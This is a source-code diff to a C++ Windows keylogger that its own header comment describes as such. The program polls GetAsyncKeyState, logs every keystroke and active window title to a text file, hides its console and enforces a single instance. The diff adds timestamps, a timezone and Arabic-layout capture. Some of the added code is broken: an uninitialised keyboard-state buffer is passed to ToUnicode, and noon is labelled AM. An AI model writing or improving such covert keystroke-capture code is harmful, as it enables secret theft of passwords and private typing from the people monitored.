@@ -1,12 +1,40 @@
+#define _CRT_SECURE_NO_WARNINGS
 #include <iostream>
 #include <fstream>
 #include <windows.h>
 #include <algorithm> 
 #include <string> 
+#include <ctime>
+#include <sstream>
 #include <tlhelp32.h> 
 
-using namespace std;
 
+/*
+    Purpose:
+        This code is designed to create a keylogger application that logs keystrokes and active window titles into a log file. The main functionalities include:
+        1. Logging keystrokes and special keys.
+        2. Recording the title of the active window whenever it changes.
+        3. Logging the date, time, and timezone along with the active window title.
+        4. Ensuring that only one instance of the specified process is running.
+        5. Hiding the console window.
+        6. Handling different keyboard layouts, including Arabic.
+        7. Implementing a multi-line comment to explain the main purpose of the code.
+        8. Exiting the application when the F1 key is pressed (for testing purposes).
+
+    Functions:
+        - SaveInFile(const string& Information): Saves information to a log file.
+        - GetActiveWindowTitle(): Retrieves the title of the active window.
+        - SpecialKeys(int key): Converts special keys to their corresponding string representations.
+        - IsOnlyOneProcessRunning(const char* processName): Checks if only one instance of a process is running.
+        - main(): The main function of the program.
+
+    Additional Notes:
+        - The code is designed to run continuously in a loop until terminated.
+        - Special keys are converted to their descriptive names before being logged.
+        - The F1 key is used as an exit trigger for testing purposes.
+*/
+
+using namespace std;
 string Log_File = "log_file.txt";
 
 void SaveInFile(const string& Information) {
@@ -26,7 +54,6 @@ string GetActiveWindowTitle() {
     }
     return "";
 }
-
 
 string SpecialKeys(int key) {
     string result;
@@ -242,20 +269,20 @@ int main() {
     const char* processName = "Project-Elsalakan.exe";
 
     if (!IsOnlyOneProcessRunning(processName)) {
-        return 0; 
+        return 0;
     }
 
-    int special_Key[] = { VK_MENU, VK_LAUNCH_APP2, VK_LAUNCH_APP1, 
-        VK_LAUNCH_MEDIA_SELECT, VK_LAUNCH_MAIL, 
-        VK_MEDIA_PLAY_PAUSE, VK_MEDIA_STOP, VK_MEDIA_PREV_TRACK, 
-        VK_MEDIA_NEXT_TRACK, VK_VOLUME_MUTE, VK_VOLUME_DOWN, 
-        VK_VOLUME_UP, VK_BROWSER_HOME, VK_BROWSER_FAVORITES, 
-        VK_BROWSER_SEARCH, VK_BROWSER_STOP, VK_BROWSER_REFRESH, 
+    int special_Key[] = { VK_MENU, VK_LAUNCH_APP2, VK_LAUNCH_APP1,
+        VK_LAUNCH_MEDIA_SELECT, VK_LAUNCH_MAIL,
+        VK_MEDIA_PLAY_PAUSE, VK_MEDIA_STOP, VK_MEDIA_PREV_TRACK,
+        VK_MEDIA_NEXT_TRACK, VK_VOLUME_MUTE, VK_VOLUME_DOWN,
+        VK_VOLUME_UP, VK_BROWSER_HOME, VK_BROWSER_FAVORITES,
+        VK_BROWSER_SEARCH, VK_BROWSER_STOP, VK_BROWSER_REFRESH,
         VK_BROWSER_FORWARD, VK_BROWSER_BACK, VK_NUMLOCK, VK_SLEEP,
-        VK_HELP, VK_EXECUTE, VK_SELECT, VK_DOWN, VK_RIGHT, VK_UP, 
-        VK_LEFT, VK_NEXT, VK_END, VK_DELETE, VK_PRIOR, VK_HOME, 
-        VK_INSERT, VK_PAUSE, VK_SCROLL, VK_SNAPSHOT, VK_APPS, 
-        VK_RWIN, VK_LWIN, VK_MENU, VK_CONTROL, VK_SHIFT, VK_ESCAPE, 
+        VK_HELP, VK_EXECUTE, VK_SELECT, VK_DOWN, VK_RIGHT, VK_UP,
+        VK_LEFT, VK_NEXT, VK_END, VK_DELETE, VK_PRIOR, VK_HOME,
+        VK_INSERT, VK_PAUSE, VK_SCROLL, VK_SNAPSHOT, VK_APPS,
+        VK_RWIN, VK_LWIN, VK_MENU, VK_CONTROL, VK_SHIFT, VK_ESCAPE,
         VK_CAPITAL, VK_TAB, VK_BACK, VK_RETURN, VK_SPACE, VK_F1, VK_F2,
         VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8, VK_F9, VK_F10, VK_F11,
         VK_F12 };
@@ -267,10 +294,46 @@ int main() {
     while (true) {
         string newWindow = GetActiveWindowTitle();
         if (!newWindow.empty() && newWindow != currentWindow) {
-            
-                currentWindow = newWindow;
-                SaveInFile("\n\n[" + currentWindow + "]\n");
-            
+            currentWindow = newWindow;
+
+            // Get the current date and time
+            time_t now = time(0);
+            tm ltm;
+
+            // Use localtime_s instead of localtime
+            localtime_s(&ltm, &now);
+
+            // Format the date and time
+            stringstream ss;
+            ss << 1900 + ltm.tm_year << "-"
+                << 1 + ltm.tm_mon << "-"
+                << ltm.tm_mday << " ";
+
+            // Check if it's PM
+            if (ltm.tm_hour > 12) {
+                ss << ltm.tm_hour - 12 << ":"
+                    << ltm.tm_min << ":"
+                    << ltm.tm_sec << " PM";
+            }
+            else if (ltm.tm_hour == 0) {
+                ss << ltm.tm_hour + 12<< ":"
+                    << ltm.tm_min << ":"
+                    << ltm.tm_sec << " AM";
+            }
+            else {
+                ss << ltm.tm_hour << ":"
+                    << ltm.tm_min << ":"
+                    << ltm.tm_sec << " AM";
+            }
+
+            string dateTime = ss.str();
+
+            // Get the current timezone
+            _tzset();
+            string timezone = _tzname[0];
+
+            // Save the window title, date/time, and timezone in the file
+            SaveInFile("\n\n[" + currentWindow + " " + dateTime + " " + timezone + "]\n");
         }
         for (int i = 8; i <= 190; i++) {
             if (GetAsyncKeyState(i) == -32767) {
@@ -280,8 +343,17 @@ int main() {
                     SaveInFile(specialK);
                 }
                 else {
-                    if (GetKeyState(VK_CAPITAL)) {
-                        SaveInFile(std::string(1, static_cast<char>(i)));
+                    HKL keyboardLayout = GetKeyboardLayout(0);
+                    WORD languageID = LOWORD(keyboardLayout);
+                    if (PRIMARYLANGID(languageID) == LANG_ARABIC) {
+                        wchar_t ch;
+                        BYTE keyboardState[256];
+                        GetKeyState(i);  // Use GetKeyState instead of GetKeyboardState
+                        if (ToUnicode(i, MapVirtualKey(i, 0), keyboardState, &ch, 1, 0) == 1) {
+                            char mbChar[2];
+                            WideCharToMultiByte(CP_UTF8, 0, &ch, 1, mbChar, 2, NULL, NULL);
+                            SaveInFile(std::string(mbChar, mbChar + 2));
+                        }
                     }
                     else {
                         SaveInFile(std::string(1, static_cast<char>(std::tolower(i))));
@@ -291,12 +363,10 @@ int main() {
         }
 
         //remove later ( for testing only )
-        if (GetAsyncKeyState(VK_F1)) 
+        if (GetAsyncKeyState(VK_F1))
             exit(0);
-        
+
     }
 
     return 0;
 }
-
-
